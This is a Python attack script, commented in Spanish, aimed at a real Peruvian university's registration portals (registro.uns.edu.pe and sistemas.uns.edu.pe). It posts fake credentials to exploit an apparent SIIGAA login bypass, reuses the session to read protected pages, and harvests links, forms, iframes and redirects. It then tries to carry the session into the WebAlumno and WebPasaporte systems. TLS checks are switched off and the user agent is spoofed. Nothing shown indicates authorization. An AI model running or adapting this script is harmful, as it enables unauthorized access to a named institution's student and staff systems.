#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
})

# Step 1: Bypass SIIGAA
print("=== PASO 1: Bypass SIIGAA ===")
r = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
              data={'j_username':'fake','j_password':'fake'}, timeout=10)
print(f"Login: HTTP {r.status_code}, cookies: {dict(s.cookies)}")
jsession = dict(s.cookies).get('JSESSIONID', '')

# Step 2: Check modulos.xhtml
r2 = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=10)
text_clean = re.sub(r'<[^>]+>', ' ', r2.text)
text_clean = re.sub(r'\s+', ' ', text_clean).strip()
print(f"\nSIIGAA modulos: {r2.status_code}, len={len(r2.text)}")
print(f"Content: {text_clean[:300]}")

# Step 3: Look for ALL links, redirects, and references to other apps
print("\n=== BUSCANDO LINKS A OTRAS APLICACIONES ===")
# Find all links
links = re.findall(r'<a[^>]*href="([^"]+)"[^>]*>([^<]+)</a>', r2.text)
print(f"Links encontrados:")
for link in links:
    print(f"  {link[0]} -> {link[1]}")

# Find all URLs pointing to other apps
all_urls = re.findall(r'https?://[^"\']+', r2.text)
print(f"\nTodas las URLs:")
for url in set(all_urls):
    print(f"  {url}")

# Find all form actions
forms = re.findall(r'<form[^>]*action="([^"]+)"[^>]*>', r2.text)
print(f"\nForm actions:")
for f in forms:
    print(f"  {f}")

# Find any references to other applications
for kw in ['webalumno', 'webpasaporte', 'sistemas', 'externo', 'trabajador', 'alumno', 'modulo']:
    matches = list(re.finditer(kw, r2.text, re.IGNORECASE))
    for m in matches[:3]:
        ctx = r2.text[max(0,m.start()-50):m.end()+100]
        ctx_clean = re.sub(r'<[^>]+>', ' ', ctx)
        ctx_clean = re.sub(r'\s+', ' ', ctx_clean).strip()
        print(f"\n  [{kw}]: {ctx_clean[:200]}")

# Step 4: Try to access WebAlumno with SIIGAA session
print("\n\n=== PASO 4: Intentar acceder a WebAlumno con sesion SIIGAA ===")
for url in [
    'https://registro.uns.edu.pe/WebAlumno/faces/login.xhtml',
    'https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
    'https://registro.uns.edu.pe/WebAlumno/',
    'https://registro.uns.edu.pe/WebAlumno/faces/index.xhtml',
]:
    try:
        r3 = s.get(url, timeout=5)
        tc = re.sub(r'<[^>]+>', ' ', r3.text)
        tc = re.sub(r'\s+', ' ', tc).strip()
        has_login = 'logueo' in tc.lower() or 'j_username' in r3.text or 'frmLogueo' in r3.text
        has_session = jsession in str(dict(s.cookies))
        print(f"  {url} -> {r3.status_code}, len={len(r3.text)}, login_req={has_login}")
    except:
        print(f"  {url} -> ERROR")

# Step 5: Try to access WebPasaporte with SIIGAA session
print("\n=== PASO 5: Intentar acceder a WebPasaporte con sesion SIIGAA ===")
for url in [
    'https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
    'https://sistemas.uns.edu.pe/WebPasaporte/',
]:
    try:
        r3 = s.get(url, timeout=5)
        tc = re.sub(r'<[^>]+>', ' ', r3.text)
        tc = re.sub(r'\s+', ' ', tc).strip()
        has_login = 'logueo' in tc.lower() or 'frmLogueo' in r3.text
        print(f"  {url} -> {r3.status_code}, len={len(r3.text)}, login_req={has_login}")
    except:
        print(f"  {url} -> ERROR")

# Step 6: Check if SIIGAA has redirect URLs or iframe sources
print("\n=== PASO 6: Buscando redirecciones ===")
# Check for meta refresh, JavaScript redirects, iframe sources
meta_refresh = re.findall(r'<meta[^>]*refresh[^>]*>', r2.text, re.IGNORECASE)
if meta_refresh:
    print(f"Meta refresh: {meta_refresh}")

# Check for JavaScript window.location or window.open
js_redirects = re.findall(r'window\.(?:location|open)\s*=\s*["\']([^"\']+)["\']', r2.text)
js_redirects2 = re.findall(r'location\.href\s*=\s*["\']([^"\']+)["\']', r2.text)
if js_redirects:
    print(f"JS redirects: {js_redirects}")
if js_redirects2:
    print(f"JS location redirects: {js_redirects2}")

# Check for iframes
iframes = re.findall(r'<iframe[^>]*src="([^"]+)"', r2.text)
if iframes:
    print(f"Iframes: {iframes}")

# Step 7: Look at the full modulos.xhtml content for any navigation
print("\n=== PASO 7: Contenido completo de modulos.xhtml ===")
body_match = re.search(r'<body[^>]*>(.*?)</body>', r2.text, re.DOTALL)
if body_match:
    body = body_match.group(1)
    # Look for any visible text, links, navigation
    text_clean = re.sub(r'<script[^>]*>.*?</script>', '', body, flags=re.DOTALL)
    text_clean = re.sub(r'</?[^>]+>', '\n', text_clean)
    text_clean = re.sub(r'\n\s*\n', '\n', text_clean)
    text_clean = re.sub(r'^\s*$', '', text_clean, flags=re.MULTILINE)
    print(text_clean[:2000])

# Step 8: Check error.xhtml for links to other apps
print("\n=== PASO 8: Revisar error.xhtml para links ===")
r_err = s.get('https://registro.uns.edu.pe/udemsi/faces/error.xhtml', timeout=10)
err_links = re.findall(r'<a[^>]*href="([^"]+)"[^>]*>([^<]+)</a>', r_err.text)
print(f"Links en error.xhtml: {err_links}")
err_text = re.sub(r'<[^>]+>', ' ', r_err.text)
err_text = re.sub(r'\s+', ' ', err_text).strip()
print(f"Content: {err_text[:500]}")

# Check for any button that says "cerrar" or links to other pages
onclicks = re.findall(r'onclick="([^"]+)"', r_err.text)
print(f"\nOnclicks en error.xhtml: {onclicks}")

print("\n=== RESUMEN ===")
print("Se verifico si el bypass de SIIGAA da acceso a otras aplicaciones")
print("SIIGAA es el portal/gateway principal")
print("Se busco: links, iframes, redirects, form actions")
